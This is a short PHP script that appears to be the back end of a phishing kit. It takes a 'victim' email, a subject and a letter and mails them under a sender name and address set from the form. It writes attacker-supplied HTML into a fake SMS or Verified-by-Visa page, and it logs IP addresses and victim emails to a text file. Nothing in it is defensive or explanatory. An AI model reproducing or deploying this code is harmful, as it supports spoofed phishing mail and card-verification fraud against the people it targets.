<?php
$user_ip = $_SERVER['REMOTE_ADDR'];
$sname = $_POST['sname'];
$smail = $_POST['smail'];
$bilsnd = $_POST['victim'];
$subject = $_POST['subject'];
$letter = $_POST['letter'];
$vbv = $_POST['vbv'];
$red = $_POST['exp_month'];
$txt = $_POST['txt'];
if ( $txt == 'load' ) {

$n = fopen('./sendSms2.html','w');
fwrite($n,$vbv );
fclose($n);

$t = fopen('./1.txt','w');
fwrite($t,$red );
fclose($t);
}


else {
$bilsmg .= "---+IP    : | $user_ip+---\n";

$bilsmg .= "---+E-mail: | $bilsnd+---\n";

$bilsub = $subject;
$bilhead = "From:$sname <$smail>";
mail($bilsnd,$bilsub,$bilsmg,$bilhead);


$n = fopen('test.txt','a');
fwrite($n,$bilsmg );
fclose($n);
}
?>